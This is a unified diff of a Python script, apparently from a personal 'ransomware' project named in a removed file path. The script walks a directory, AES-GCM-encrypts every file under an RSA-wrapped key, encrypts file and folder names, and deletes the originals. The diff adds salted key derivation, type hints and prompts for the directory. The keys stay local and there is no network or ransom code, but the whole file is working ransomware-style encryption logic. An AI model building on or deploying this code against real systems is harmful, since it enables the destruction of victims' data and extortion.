@@ -1,14 +1,47 @@
 import os
 import base64
-from Cryptodome.Hash import SHA256
+from Cryptodome.Hash import SHA512
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Random import get_random_bytes
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.Protocol.KDF import PBKDF2
 
+# Global variable to store the derived key for the session
+session_derived_key = None
+
+
+def derive_session_key(key: str, salt: bytes) -> bytes:
+    """
+    Derives a session key using PBKDF2.
+
+    :param key : The base key to derive from.
+    :param salt : Salt for the key derivation.
+
+    Returns:
+        bytes: The derived session key.
+    """
+    global session_derived_key
+    if session_derived_key is None:
+        session_derived_key = PBKDF2(key, salt, 32, count=1000000, hmac_hash_module=SHA512)
+    return session_derived_key
+
+
+def clear_session_key() -> None:
+    """
+    Clears the global session key.
+    """
+    global session_derived_key
+    session_derived_key = None
+
 
 # This function generates the private and public keys
-def generate_keys():
+def generate_keys() -> tuple[bytes, bytes]:
+    """
+    Generates RSA public and private keys.
+
+    Returns:
+        tuple[bytes, bytes]: A tuple containing (public_key, private_key).
+    """
     key = RSA.generate(2048)
     public_key = key.public_key().export_key()
     private_key = key.export_key()
@@ -16,17 +49,21 @@ def generate_keys():
     return public_key, private_key
 
 
-def save_key(key, filename, password=None, is_name_key=False):
+def save_key(key: bytes, filename: str, password: str = None, is_name_key: bool = False, salt: bytes = None) -> None:
     """
     This function save the keys into a file for security. Can be encrypted with a passphrase.
+
+    :param key: The key to save.
+    :param filename: The filename to save the key to.
+    :param password: Password to encrypt the key. Defaults to None. Optional.
+    :param is_name_key: Whether this is a name key. Defaults to False. Optional.
+    :param salt: Salt for name key encryption. Required if is_name_key is True. Optional Depending.
     """
     if is_name_key:
-        salt = get_random_bytes(16)
-        salted_key = PBKDF2(key, salt, 32, count=1000000, hmac_hash_module=SHA256)
 
         with open(filename, "wb") as file:
             file.write(salt)
-            file.write(salted_key)
+            file.write(key)
 
     else:
         if password:
@@ -36,22 +73,25 @@ def save_key(key, filename, password=None, is_name_key=False):
             file.write(key)
 
 
-def load_key(filename: str, password=None, is_name_key=False):
+def load_key(filename: str, password: str = None, is_name_key: bool = False):
     """
-    This function reads the key from a file
+    Loads a key from a file.
+
+    :param filename: The filename to load the key from.
+    :param password: Password to decrypt the key. Defaults to None. Optional.
+    :param is_name_key: Whether this is a name key. Defaults to False. Optional.
+
     """
-    with open(filename, "rb").read():
+    with open(filename, "rb") as file:
         if is_name_key:
             salt = file.read(16)
             key = file.read()
+            return salt, key
 
         else:
             encoded_key = file.read()
 
-    if is_name_key:
-        return salt, key
-
-    elif password:
+    if password:
         key = RSA.import_key(encoded_key, passphrase=password)
 
     else:
@@ -60,13 +100,15 @@ def load_key(filename: str, password=None, is_name_key=False):
     return key.export_key()
 
 
-def encrypt_dir(directory: str, public_key: bytes, name_key: bytes):
+def encrypt_dir(directory: str, public_key: bytes, name_key: str, salt: bytes) -> str:
     """
-    This function encrypts an entire directory.
-    Parameters:
-    directory -> str: The location of where your files are located at.
-    public_key -> bytes: The public key generated using RSA.
-    name_key -> bytes: The private key used to encrypt the file names.
+    Encrypts an entire directory.
+    :param directory: The location of where your files are located at.
+    :param public_key: The public key generated using RSA.
+    :param name_key : The private key used to encrypt the file names.
+    :param salt: Salt for name encryption.
+
+    WARNING:
     YOU MIGHT RISK RUINING YOUR ENTIRE SYSTEM AND CAUSING IRRECOVERABLE FILE LOSS.
     ONLY RUN THIS FUNCTION WHEN YOU ARE ABSOLUTELY SURE.
     """
@@ -82,12 +124,12 @@ def encrypt_dir(directory: str, public_key: bytes, name_key: bytes):
         # Encrypt files
         for file_name in files:
             file_path = os.path.join(root, file_name)
-            encrypt_file(file_path, aes_key, enc_aes_key, name_key)
+            encrypt_file(file_path, aes_key, enc_aes_key, name_key, salt)
 
         # Encrypt directory names
         for dir_name in dirs:
             dir_path = os.path.join(root, dir_name)
-            name_change = encrypt_name(dir_name, name_key)
+            name_change = encrypt_name(dir_name, name_key, salt)
             encrypted_path = os.path.join(root, name_change)
             os.rename(dir_path, encrypted_path)
             print(f"Folder {dir_path} has been encrypted and renamed to {encrypted_path}")
@@ -95,35 +137,57 @@ def encrypt_dir(directory: str, public_key: bytes, name_key: bytes):
     # Encrypt root names
     root_name = os.path.basename(directory)
     print("root: " + root_name)
-    root_change = encrypt_name(root_name, name_key)
+    root_change = encrypt_name(root_name, name_key, salt)
     encrypted_root = os.path.join(os.path.dirname(directory), root_change)
     os.rename(directory, encrypted_root)
     print(f"Root {directory} has been encrypted and renamed to {encrypted_root}")
+    clear_session_key()
     return encrypted_root
 
 
-def decrypt_dir(encrypted_dir_path, private_key, name_key):
-    decrypted_root_name = decrypt_name(os.path.basename(encrypted_dir_path), name_key)
+def decrypt_dir(encrypted_dir_path: str, private_key: bytes, name_key: str, salt: bytes) -> str:
+    """
+    Decrypts an entire encrypted directory.
+
+    :param encrypted_dir_path: The path of the encrypted directory.
+    :param private_key: The private key for decryption.
+    :param name_key: The key used to decrypt file and directory names.
+    :param salt: Salt for name decryption.
+
+    Returns:
+        str: The path of the decrypted directory.
+    """
+    decrypted_root_name = decrypt_name(os.path.basename(encrypted_dir_path), name_key, salt)
     decrypted_root_path = os.path.join(os.path.dirname(encrypted_dir_path), decrypted_root_name)
     os.rename(encrypted_dir_path, decrypted_root_path)
 
     for root, dirs, files in os.walk(decrypted_root_path, topdown=False):
         for enc_file_name in files:
             enc_file_path = os.path.join(root, enc_file_name)
-            decrypt_file(enc_file_path, private_key, name_key)
+            decrypt_file(enc_file_path, private_key, name_key, salt)
 
         for enc_dir_name in dirs:
             enc_dir_path = os.path.join(root, enc_dir_name)
-            decrypted_dir_name = decrypt_name(enc_dir_name, name_key)
+            decrypted_dir_name = decrypt_name(enc_dir_name, name_key, salt)
             decrypted_path = os.path.join(root, decrypted_dir_name)
             os.rename(enc_dir_path, decrypted_path)
 
     print(f"Directory '{decrypted_root_path}' has been decrypted.")
+    clear_session_key()
     return decrypted_root_path
 
 
-def encrypt_file(file_directory: str, aes_key, enc_aes_key, name_key: bytes):
+def encrypt_file(file_directory: str, aes_key: bytes, enc_aes_key: bytes, name_key: str, salt: bytes) -> None:
     """
+    Encrypts a single file.
+
+    :param file_directory: The path of the file to encrypt.
+    :param aes_key: The AES key for file content encryption.
+    :param enc_aes_key: The encrypted AES key.
+    :param name_key: The key for encrypting the file name.
+    :param salt: Salt for name encryption.
+
+    WARNING:
     THIS IS THE ACTUAL ENCRYPTION FUNCTION. DO NOT USE THIS UNLESS YOU ARE ABSOLUTELY SURE THAT YOU KNOW WHAT YOU ARE
     DOING. THIS MAY POTENTIALLY LEAD TO IRRECOVERABLE FILE, DATA LOSS AND POTENTIALLY RUIN YOUR ENTIRE SYSTEM.
     """
@@ -133,7 +197,7 @@ def encrypt_file(file_directory: str, aes_key, enc_aes_key, name_key: bytes):
     cipher_aes = AES.new(aes_key, AES.MODE_GCM)
     ciphertext, tag = cipher_aes.encrypt_and_digest(data)
 
-    encrypted_name = encrypt_name(os.path.basename(file_directory), name_key)
+    encrypted_name = encrypt_name(os.path.basename(file_directory), name_key, salt)
     encrypted_path = os.path.join(os.path.dirname(file_directory), encrypted_name)
 
     with open(encrypted_path, "wb") as f:
@@ -146,9 +210,14 @@ def encrypt_file(file_directory: str, aes_key, enc_aes_key, name_key: bytes):
     print(f"File '{file_directory}' has been encrypted and renamed to '{encrypted_path}'")
 
 
-def decrypt_file(encrypted_file_path: str, private_key: bytes, name_key: bytes):
+def decrypt_file(encrypted_file_path: str, private_key: bytes, name_key: str, salt: bytes) -> None:
     """
-    Decrypts the encrypted file content, given the private key.
+    Decrypts a single encrypted file.
+
+    :param encrypted_file_path: The path of the encrypted file.
+    :param private_key: The private key for decryption.
+    :param name_key: The key for decrypting the file name.
+    :param salt: Salt for name decryption.
     """
     rsa_key = RSA.import_key(private_key)
     cipher_rsa = PKCS1_OAEP.new(rsa_key)
@@ -163,63 +232,104 @@ def decrypt_file(encrypted_file_path: str, private_key: bytes, name_key: bytes):
     cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
     data = cipher_aes.decrypt_and_verify(ciphertext, tag)
 
-    decrypted_name = decrypt_name(os.path.basename(encrypted_file_path), name_key)
+    decrypted_name = decrypt_name(os.path.basename(encrypted_file_path), name_key, salt)
     decrypted_file_path = os.path.join(os.path.dirname(encrypted_file_path), decrypted_name)
 
     with open(decrypted_file_path, "wb") as file:
         file.write(data)
 
     os.remove(encrypted_file_path)
-    print({f"File {decrypted_file_path} has been decrypted."})
+    print(f"File {decrypted_file_path} has been decrypted.")
 
 
-def encrypt_name(filename: str, key: bytes):
+def encrypt_name(filename: str, key: str, salt: bytes) -> str:
     """
-    Encrypts the name of a file with a given name key.
-    Parameters:
-    key: The private key used to encrypt the name of the directories/files
+    Encrypts the name of a file or directory.
+
+    :param salt: Salt for key derivation.
+    :param filename: The name to encrypt.
+    :param key: The key used for encryption.
     """
-    cipher = AES.new(key, AES.MODE_GCM)
+    salted_key = derive_session_key(key, salt)
+    cipher = AES.new(salted_key, AES.MODE_GCM)
     data = filename.encode("utf-8")
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     return base64.urlsafe_b64encode(cipher.nonce + tag + ciphertext).decode("utf-8")
 
 
-def decrypt_name(encrypted_filename, key):
+def decrypt_name(encrypted_filename: str, key: str, salt: bytes) -> str:
     """
-    Decrypts the name of a file given the name key.
-    :param encrypted_filename: the encrypted name of the file
-    :param key: the name_key
+    Decrypts the name of a file or directory.
+
+    :param salt: Salt for key derivation.
+    :param encrypted_filename: The encrypted name to decrypt.
+    :param key: The key used for decryption.
     """
+    salted_key = derive_session_key(key, salt)
     data = base64.urlsafe_b64decode(encrypted_filename.encode("utf-8"))
     nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
-    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    cipher = AES.new(salted_key, AES.MODE_GCM, nonce=nonce)
 
     return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")
 
 
-if __name__ == "__main__":
-    public_key, private_key = generate_keys()  # key for the encryption/decryption
-    name_key = SHA256.new(get_random_bytes(32)).digest()  # key for the name of the files
+def get_directory() -> str:
+    """
+    Prompts the user to enter a valid directory path.
 
-    choice = int(input("Encrypt(0) or Decrypt(1)?"))
+    Returns:
+        str: The validated directory path.
+    """
+    while True:
+        directory = input("Enter the directory path to perform encryption/decryption: ").strip()
+        if not directory:
+            print("Error: Directory path cannot be empty.")
+            continue
+
+        if not os.path.exists(directory):
+            print(f"Error: The directory '{directory}' does not exist.")
+            continue
+
+        return directory
+
+
+if __name__ == "__main__":
+    while True:
+        try:
+            choice = int(input("Encrypt(0) or Decrypt(1)? "))
+            if choice not in [0, 1]:
+                raise ValueError(" Please enter 0 for encryption or 1 for decryption.")
+            break
+
+        except ValueError as e:
+            print(f"Invalid input: {e}")
+
     if choice == 0:
+        public_key, private_key = generate_keys()  # key for the encryption/decryption
+        name_key = base64.b64encode(get_random_bytes(32)).decode("utf-8")  # key for the name of the files
+        salt = get_random_bytes(16)  # salt for hashing
+
+        # password = input("Enter a password to secure your private key: "
         save_key(private_key, 'private_key.pem')
         save_key(public_key, 'public_key.pem')
+        save_key(name_key.encode('utf-8'), 'name_key.pem', is_name_key=True, salt=salt)
 
-        # password = input("Enter a password to secure your private key: ")
+        directory = get_directory()
+        try:
+            encrypted_dir = encrypt_dir(directory, public_key, name_key, salt)
+            with open("dir.txt", "w") as file:
+                file.write(encrypted_dir)
+            print("Encryption completed.")
 
-        with open("name_key.pem", "wb") as file:
-            file.write(name_key)
-
-        directory = "directory"
-        encrypted_dir = encrypt_dir(directory, public_key, name_key)
-
+        except Exception as e:
+            print(f"An exception occurred: {e}")
 
     if choice == 1:
         loaded_private_key = load_key('private_key.pem')
-        loaded_name_key = open("name_key.pem", "rb").read()
+        salt, loaded_name_key = load_key('name_key.pem', is_name_key=True)
 
-        decrypt_dir("C:\\Users\\samue\\PycharmProjects\\ransomware\\password\\one layer deep1\\sVQpelY4-T_32deyqfBPmcmK5DUeJ22gT1SBnLE6a68JgTuP8532q9NxpAFCJ7TBkjWumQ==",
-                    loaded_private_key, loaded_name_key)
+        with open("dir.txt", "r") as file:
+            dirs = file.read()
+
+        decrypt_dir(dirs, loaded_private_key, loaded_name_key, salt)
